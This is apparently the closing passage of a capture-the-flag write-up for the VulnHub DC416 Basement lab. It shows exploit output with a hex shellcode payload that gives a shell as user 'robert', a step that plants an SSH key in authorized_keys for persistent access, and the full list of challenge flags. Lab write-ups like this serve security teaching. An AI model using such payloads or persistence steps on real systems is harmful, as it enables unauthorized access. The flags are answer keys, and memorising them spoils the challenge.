[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Payload: \x01\xd2\x5f\x48\x83\xef\x25\xff\xe7\x90
[*] Iterations: 8
[*] EDX should now be 0x500
[*] Sending shellcode
[*] Found offset!!! 37
[*] Switching to interactive mode
$ $ id
uid=1003(robert) gid=1003(robert) groups=1003(robert)
$ $
```

Now we are able to add our private key file to `/home/robert/.ssh/authorized_keys` connect as `robert` via SSH and get the next flag `flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}`

Now we can also get the `tenbytes` binary and look at it to confirm our script

![binaryninja](/img/vulnhub_dc416_basement/binaryninja.png)

Thanks [@barrebas](https://twitter.com/barrebas) for a lot hours trying to blindly bruteforce the binary :)

The flags:

```
flag{j4cks_t0t4L_l4cK_0f_$uRpr1sE}
flag{bR4in_paRas1te$}
flag{l3t_Th3_cH1P$_f4LL_wH3Re_tHey_m4y}
flag{t3N_byt3$_0ugHt_t0_b3_eN0uGh_f0R_4nyb0dY}
flag{l4y3rs_up0n_l4y3rs}
```
